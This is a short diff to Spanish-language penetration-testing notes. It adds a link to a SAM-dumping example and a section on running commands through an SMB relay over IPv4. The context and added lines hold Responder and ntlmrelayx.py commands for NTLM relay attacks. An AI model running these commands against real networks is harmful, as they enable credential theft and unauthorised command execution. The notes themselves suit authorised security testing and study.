@@ -41,3 +41,9 @@ python /usr/share/responder.py -I tun0 -rdw
 ```
 ntlmrelayx.py -tf <targets.txt> -smb2support
 ```
+[Ver Ejemplo de dumpeo de SAM](Images/sam/README.md)
+
+# Ejecutar comandos mediante un SMB Relay por IPv4
+```
+ntlmrelayx.py -tf <targets.txt> -smb2support
+```
